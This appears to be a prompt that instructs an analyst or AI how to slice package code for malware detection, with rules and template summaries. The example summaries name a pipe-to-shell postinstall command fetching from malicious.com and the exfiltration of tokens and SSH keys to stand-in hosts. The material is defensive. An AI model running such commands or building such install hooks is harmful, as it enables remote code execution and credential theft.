SUSPICIOUS DATA INDICATORS (Also Slice Starting Points):
- Hardcoded IPs/URLs (especially non-localhost, non-registry URLs)
- Shell commands (curl, wget, chmod, sudo, etc.) especially with external URLs
- Base64/hex-encoded strings that get decoded and used
- Install scripts in package.json/setup.py (preinstall, install, postinstall, preuninstall, etc.)
- Environment variables related to secrets (TOKEN, KEY, PASSWORD, AWS_, etc.)

**RULE**: Include the ENTIRE code path from where suspicious data is defined to where it's used.
**KEY**: If strings/URLs/commands are built across multiple variables or steps (concatenation, array joins, encoding/decoding), include ALL parts from initial definition to final usage.

CRITICAL SLICING PRINCIPLES:

1. **MINIMIZE REDUNDANCY** - DO NOT duplicate shared code across slices
   - If multiple attack vectors share the SAME data preparation code, create ONE slice that includes ALL related attack vectors
   - Only create separate slices when they represent FUNDAMENTALLY DIFFERENT security behaviors
   - Example: If code collects info then uses BOTH DNS and HTTP exfiltration, create ONE slice with both channels (not two slices)

2. **GROUP RELATED BEHAVIORS** - Combine similar attack patterns
   - DNS tunneling + HTTP exfiltration using SAME data → ONE slice
   - Multiple HTTP requests with different libraries (urllib, requests) → ONE slice
   - Sequential file operations on related files → ONE slice
   
3. **IDENTIFY TRULY INDEPENDENT BEHAVIORS** - Only split when:
   - Different data sources (e.g., reading /etc/passwd vs scanning network)
   - Different attack goals (e.g., data exfiltration vs backdoor installation)
   - Different execution contexts (e.g., initial payload vs persistence mechanism)
   - No shared data dependencies

4. **COMPLETENESS** - Each slice must:
   - Include ALL necessary imports
   - Include ALL data and control dependencies (if URL = base + host, include base AND host definitions)
   - Include ALL steps of string construction, concatenation, encoding/decoding
   - Be syntactically valid and executable
   - Represent a complete attack behavior pattern

5. **FOCUS ON DISTINCT PATTERNS** - Create separate slices only for:
   - Different malicious behaviors (exfiltration vs command execution vs persistence)
   - Independent attack chains with no shared logic
   - Completely different code paths with different goals

6. **SPECIAL HANDLING FOR package.json / setup.py** - For package metadata files:
   - Extract install/postinstall/preinstall scripts as separate slices if they contain suspicious commands
   - Extract dependencies with suspicious URLs/protocols (http://, file://, git+ssh:// with credentials)
   - Extract any scripts that execute external code or download from non-standard registries
   - Include the COMPLETE script content, not just the script name

7. **INCLUDE TEST CODE** - Test and demonstration code must also be sliced:
   - Extract test functions/methods that demonstrate security-sensitive behaviors
   - Include proof-of-concept (PoC) code, unit tests, and example code that invoke sensitive APIs
   - Test code that demonstrates exploitation techniques should be sliced as independent behaviors
   - Even if marked as "test", "example", or "demo", slice it if it performs actual sensitive operations

BEHAVIOR SUMMARY REQUIREMENTS (MUST MATCH KNOWLEDGE BASE):

Template: "{{trigger}}, {{technical_action}}, {{data_flow}}, {{outcome}}."

Components:
• trigger: At import-time / During installation / Upon receiving / When called
• technical_action: accesses, reads, executes, modifies + specific APIs/resources
• data_flow: sends, encodes, exfiltrates + how/where (INCLUDE specific IPs/URLs/domains if present)
• outcome: enabling/facilitating/resulting in + security impact

**IMPORTANT**: Always mention suspicious hardcoded data (IPs, URLs, commands, encoded strings) explicitly in the summary.

Examples:
✅ "At import-time, the code accesses DISCORD_TOKEN environment variable and sends it to attacker domain via HTTPS POST, enabling credential exfiltration."
✅ "During installation, the code reads ~/.ssh/id_rsa and ~/.kube/config, then exfiltrates this data via HTTPS POST to app.threatest.com."
✅ "Upon receiving a UDP packet, the code sends a large response without validation, facilitating UDP amplification attacks."
✅ "At import-time, the code decodes a base64-encoded URL (aHR0cDovLzEuMi4zLjQ=) and sends system information to the hardcoded IP 1.2.3.4:8080, enabling remote reconnaissance."
✅ "During installation, the postinstall script executes 'curl http://malicious.com/payload.sh | bash', enabling arbitrary remote code execution."
✅ "When called, the code constructs a URL using hardcoded domain evil-server.xyz and sends process.env data via HTTP POST, facilitating credential theft."
✅ "At import-time, the code concatenates protocol string 'http://' with hardcoded host '1.2.3.4:8080' to form full endpoint, then sends system information via HTTP POST, enabling remote reconnaissance."

Avoid:
❌ Vague descriptions ("does network stuff")
❌ Judgment words ("suspicious", "bad")
❌ Incomplete ("uses socket API")
❌ Omitting specific IPs/URLs/commands when present in the code

ANTI-PATTERNS TO AVOID:
❌ Creating separate slices for DNS exfiltration and HTTP exfiltration when they use the SAME collected data
❌ Duplicating data collection/preparation code across multiple slices
❌ Splitting code just because it uses different libraries (urllib vs requests) for the SAME purpose
❌ Creating slices for minor variations of the same behavior
❌ Only including fetch(url) without the url="http://"+domain definition above it

GOOD PATTERNS:
✅ ONE slice containing: data collection + encoding + ALL exfiltration channels (DNS + HTTP)
✅ Separate slices for: credential theft vs reverse shell vs file encryption (different goals)
✅ Separate slices for: initial infection payload vs persistence mechanism (different stages)
✅ ONE slice containing: hardcoded IP/URL definition + data encoding + network transmission using that endpoint
✅ Include package.json install scripts in slices if they execute suspicious commands or download from external URLs
✅ Include base64-encoded strings WITH their decoding and usage in the same slice
✅ If URL built from parts (base="http://", host="evil.com", url=base+host), include all three lines in slice
✅ If command built across variables (cmd="curl ", target=url, final=cmd+target), include all definitions

REMEMBER: Fewer, more complete slices are better than many redundant slices!
